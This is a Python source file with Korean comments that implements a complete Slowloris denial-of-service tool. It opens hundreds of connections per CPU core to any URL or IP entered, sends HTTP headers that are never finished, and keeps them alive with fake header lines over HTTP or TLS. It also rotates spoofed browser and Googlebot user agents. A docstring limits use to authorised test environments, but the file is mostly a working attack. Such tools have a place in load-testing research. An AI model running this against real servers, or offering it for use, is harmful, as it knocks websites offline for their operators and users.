#!/usr/bin/env python3
"""
Slowloris DoS 테스터.

HTTP/1.1 요청 헤더를 완료하지 않은 TCP 연결 여러 개를 유지하면서
주기적으로 추가 헤더를 흘려보내는 Slowloris 동작 실험 코드. (IPv4, 루트 경로 GET /)
HTTP(평문)와 HTTPS(TLS) 둘 다 지원한다.
본인 소유이거나 명시적으로 허가받은 격리 환경에서만 사용할 것.
"""
import socket
import ssl
import os
import time
import random
from urllib.parse import urlparse
from multiprocessing import Process, Value, Array

# 연결마다 랜덤으로 붙이는 User-Agent — 다양한 UA에 대한 서버 로그/탐지 동작 확인용
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

# 실패 유형 카운터 인덱스 (프로세스 공유 배열의 위치)
ERR_DNS = 0        # 이름 해석 실패
ERR_REFUSED = 1    # 연결 거부 (서버가 안 받음)
ERR_TIMEOUT = 2    # 타임아웃 (connect/handshake/send)
ERR_TLS = 3        # TLS 핸드셰이크 오류
ERR_OTHER = 4      # 그 외
ERR_LABELS = ["DNS", "연결거부", "타임아웃", "TLS", "기타"]


def resolve_target(raw):
    """입력받은 URL/호스트/IP에서 (호스트명, IP, TLS여부, 포트)를 뽑는다. (IPv4 전용)
    경로(/path)는 무시하며, 요청은 항상 루트(GET /)로 보낸다."""
    raw = raw.strip()
    use_tls = raw.startswith("https://")
    if "://" in raw:
        raw = urlparse(raw).netloc        # http:// / https:// 는 항상 netloc만 사용
    port = None
    if raw.count(":") == 1:               # host:port 분리 (IPv6 미지원)
        raw, p = raw.split(":")
        port = int(p)
    ip = socket.gethostbyname(raw)        # 호스트명이면 DNS 변환, IP면 그대로
    return raw, ip, use_tls, port


def build_request(host):
    """연결마다 새로 만드는 '미완성' HTTP 요청 (루트 경로).
    끝의 빈 줄(\\r\\n\\r\\n)을 일부러 안 보내 서버가 요청이 안 끝났다고 여기게 한다.
    Host 헤더에는 (IP가 아니라) 원래 호스트명을 넣어 VirtualHost로도 제대로 도달하게 한다."""
    ua = random.choice(USER_AGENTS)
    return (f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n").encode()


def classify_error(e):
    """예외를 실패 유형 인덱스로 분류."""
    if isinstance(e, socket.gaierror):
        return ERR_DNS
    if isinstance(e, ssl.SSLError):
        return ERR_TLS
    if isinstance(e, (socket.timeout, TimeoutError)):
        return ERR_TIMEOUT
    if isinstance(e, ConnectionRefusedError):
        return ERR_REFUSED
    return ERR_OTHER


def open_conn(host, ip, port, use_tls, errors=None):
    """연결 하나 맺고 미완성 요청 조각을 보낸 소켓 반환. 실패하면 None.
    연결은 ip로, Host 헤더에는 host를 쓴다. use_tls면 TLS로 감싼다.
    실패 시 유형을 errors 배열에 집계하고, 만든 소켓은 반드시 닫는다."""
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)                   # connect·TLS 핸드셰이크·이후 send 모두에 적용
        s.connect((ip, port))
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False    # 테스트용: 자체서명 인증서 허용
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)   # SNI로 host 전달
        s.sendall(build_request(host))    # 조각 전체 전송 보장
        return s
    except Exception as e:
        if errors is not None:
            idx = classify_error(e)
            with errors.get_lock():
                errors[idx] += 1
        if s is not None:                 # 실패한 소켓은 명시적으로 닫아 FD 누수 방지
            try:
                s.close()
            except Exception:
                pass
        return None


def worker(host, ip, port, use_tls, per_proc, counter, errors, stop_after):
    """[프로세스] per_proc개 연결을 맺고 계속 붙잡는다.
    counter: 클라이언트가 활성 상태로 추적 중인 소켓 수(프로세스 공유).
    errors: 실패 유형별 카운터(프로세스 공유). stop_after: 지속 시간(초, 0=무한)."""
    sockets = []
    start = time.time()

    def _drop(sock):
        """소켓 하나를 닫고 counter를 정확히 감소."""
        try:
            sock.close()
        except Exception:
            pass
        with counter.get_lock():
            counter.value -= 1

    # 1) 목표 개수까지 연결을 맺어 붙잡는다
    for _ in range(per_proc):
        s = open_conn(host, ip, port, use_tls, errors)
        if s:
            sockets.append(s)
            with counter.get_lock():
                counter.value += 1

    # 2) 맺은 연결을 유지 — 가끔 미완성 헤더 한 줄을 흘려보내 서버 타임아웃 방지
    try:
        while True:
            if stop_after and (time.time() - start) >= stop_after:
                break
            for s in list(sockets):
                try:
                    s.sendall(f"X-a: {random.randint(1, 99999)}\r\n".encode())
                except Exception:
                    # 서버가 끊었거나 실패 → 정리(counter 감소)하고 새 연결로 보충
                    sockets.remove(s)
                    _drop(s)
                    ns = open_conn(host, ip, port, use_tls, errors)
                    if ns:
                        sockets.append(ns)
                        with counter.get_lock():
                            counter.value += 1
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    finally:
        # 정상 종료(stop_after) 시 counter가 어긋나지 않게 닫으면서 감소
        for s in list(sockets):
            _drop(s)


def reporter(counter, errors, stop_flag):
    """1초마다 추적 중인 소켓 수와 실패 유형별 누계를 출력."""
    try:
        while not stop_flag.value:
            errs = " ".join(f"{ERR_LABELS[i]}:{errors[i]}" for i in range(len(ERR_LABELS)))
            print(f"[*] 추적 중 소켓: {counter.value} | 실패 {errs}")
            time.sleep(1)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    # ── 입력 ──
    target = input("대상 URL/IP (http/https, IPv4): ").strip()
    host, ip, use_tls, url_port = resolve_target(target)

    if url_port is not None:
        port = url_port
    else:
        default = 443 if use_tls else 80
        port = int(input(f"포트(기본 {default}): ") or str(default))

    scheme = "HTTPS/TLS" if use_tls else "HTTP"
    print(f"[*] 대상: {host} ({ip}):{port} [{scheme}]")

    # ── 설정 ──
    processes = os.cpu_count()
    conns = 500

    counter = Value("i", 0)                       # 추적 중인 소켓 수
    errors = Array("i", [0] * len(ERR_LABELS))    # 실패 유형별 카운터 (프로세스 공유)
    stop_flag = Value("i", 0)

    print(f"[*] Slowloris → {ip}:{port}")
    print(f"[*] 프로세스 {processes} × 연결 {conns} = 목표 {processes * conns}")
    print("[*] 중단: Ctrl+C")

    procs = [Process(target=worker, args=(host, ip, port, use_tls, conns, counter, errors, 0))
             for _ in range(processes)]
    rep = Process(target=reporter, args=(counter, errors, stop_flag))

    for p in procs:
        p.start()
    rep.start()

    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        print("\n[*] 중단 — 연결 정리 중...")
    finally:
        stop_flag.value = 1
        for p in procs:
            p.terminate()
        rep.terminate()
        print("[*] 종료")
